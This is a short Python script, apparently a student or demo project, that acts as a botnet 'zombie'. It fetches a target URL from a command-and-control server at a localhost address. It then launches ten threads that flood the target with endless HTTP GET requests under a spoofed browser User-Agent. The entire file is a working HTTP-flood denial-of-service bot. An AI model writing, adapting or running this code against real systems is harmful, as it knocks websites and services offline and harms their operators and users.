import requests
import threading
import sys



def attack (dest):
    print ("Thread Initiated")
    headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:105.0) Gecko/20100101 Firefox/105.0'}
    while (1):
        response = requests.get(dest, headers=headers)
        print ("Sent a request ,",response.status_code,"\n")
        
        


print ("Starting Botnet in Zombie Mode. Waiting for instructions from C2 Server")
r = requests.get("http://127.0.0.1:5000/c2/url")

if(r.status_code != 200):
    sys.exit("No response from the C2 Server \n Botnet Terminated")



print ("Recieved instructions from C2 Server \n")
d = r.content
d=d.decode('UTF-8')
print ("Launching attack on ",d,'\n')
t1 = threading.Thread(target=attack, args=(d,))
t2 = threading.Thread(target=attack, args=(d,))
t3 = threading.Thread(target=attack, args=(d,))
t4 = threading.Thread(target=attack, args=(d,))
t5 = threading.Thread(target=attack, args=(d,))
t11 = threading.Thread(target=attack, args=(d,))
t12 = threading.Thread(target=attack, args=(d,))
t13 = threading.Thread(target=attack, args=(d,))
t14 = threading.Thread(target=attack, args=(d,))
t15 = threading.Thread(target=attack, args=(d,))

t1.start()
t2.start()
t3.start()
t4.start()
t5.start()
t11.start()
t12.start()
t13.start()
t14.start()
t15.start()
